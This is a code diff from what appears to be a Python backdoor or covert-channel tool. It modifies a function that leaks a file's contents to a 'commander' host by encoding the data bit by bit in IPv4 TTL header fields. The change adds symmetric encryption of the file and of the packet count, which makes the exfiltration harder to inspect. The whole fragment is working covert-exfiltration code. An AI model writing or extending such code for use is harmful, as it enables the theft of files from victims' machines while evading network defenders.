@@ -1464,7 +1464,8 @@ def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
 # ================== COVERT FILE TRANSFER TO CMDR FUNCTIONS ==================
 
 
-def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: str):
+def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str,
+                           file_path: str, shared_key: bytes):
     """
     Hides file data covertly in IPv4 headers using the
     TTL field.
@@ -1481,14 +1482,16 @@ def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: 
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Split the binary data into chunks that fit within the TTL range (0-255)
     ttl_chunk_size = 8  # MAX SIZE is 8 bits == (1 char)
@@ -1496,7 +1499,7 @@ def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: 
 
     # d) Send total number of packets to the client
     total_packets = str(len(chunks))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
